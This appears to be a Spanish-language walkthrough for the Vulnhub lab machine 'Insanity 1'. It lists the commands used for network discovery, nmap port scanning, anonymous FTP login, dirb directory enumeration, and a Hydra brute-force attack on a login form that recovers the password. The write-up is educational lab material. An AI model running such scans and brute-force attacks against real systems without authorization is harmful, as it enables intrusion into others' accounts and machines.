<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=FF0000&width=530&height=80&lines=INSANITY_HOSTING"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/insanity-1,536/

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con Arp-Scan. 
```
arp-scan --interface wlan0 -l
```
![1](https://user-images.githubusercontent.com/75953873/177059310-4e781fd1-10e5-4204-a0e4-1cb0101ea678.png)

IP host: `192.168.1.10`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.10
```
![2](https://user-images.githubusercontent.com/75953873/177059371-cdbe2b44-c0bb-47bc-843e-443e7f8e38a6.png)

Puertos abiertos: [21,22,80]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 21,22,80 -A 192.168.1.10
```
![3](https://user-images.githubusercontent.com/75953873/177059471-f34e40d9-8d65-4731-9ea1-15efd130ca17.png)

Servidor corriendo: **HTTP Apache**

Servicio FTP: permite el inicio de sesión anónimo.

O.S: Linux (**CentOS**)

URL: `http://192.168.1.10`

- *Paso 4:* Loguearse al servicio FTP. 
```
ftp 192.168.1.10
```
Usuario: `anonymous`

Contraseña: `anonymous`

![4](https://user-images.githubusercontent.com/75953873/177059681-c67a449f-966c-4557-857a-fb6b689ee742.png)

- *Paso 5:* Enumerar archivos y directorios con Dirb. 
```
dirb http://192.168.1.10/monitoring -X .php -w /usr/share/wordlists/dirb/common.txt 
```
![5](https://user-images.githubusercontent.com/75953873/177060618-20a3b175-70f1-4446-9a98-06fd3472b895.png)

URL completa: `http://192.168.1.10/monitoring/login.php`

![6](https://user-images.githubusercontent.com/75953873/177060649-2c0299a6-1293-4ff3-bd57-3d7f2c377c33.png)

```
dirb http://192.168.1.10 -N .php,.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![7](https://user-images.githubusercontent.com/75953873/177060767-64de6138-1ce3-4e06-a2fe-6d73901a3d29.png)

URL completa: `http://192.168.1.10/news`

![8](https://user-images.githubusercontent.com/75953873/177060834-7c34ccb2-29a1-49ff-bf16-b4bee6137d79.png)

```
dirb http://192.168.1.10/news -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![9](https://user-images.githubusercontent.com/75953873/177060944-32c81f13-e6db-4029-ac2c-f9e2d654ebf1.png)

URL completa: `http://192.168.1.10/news/admin/`

![10](https://user-images.githubusercontent.com/75953873/177060975-9ea24383-8fb2-4b1d-a3d2-b33eef1c75a0.png)

- *Paso 6:* Aplicar fuerza bruta a inicio de sesión con Hydra.

```
hydra -l otis -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/monitoring/index.php:username=^USER^&password=^PASS^:Password"
```
![12](https://user-images.githubusercontent.com/75953873/177061649-80af992e-4472-4625-bf57-460e7bd74773.png)

Usuario: `otis`

Contraseña: `123456`
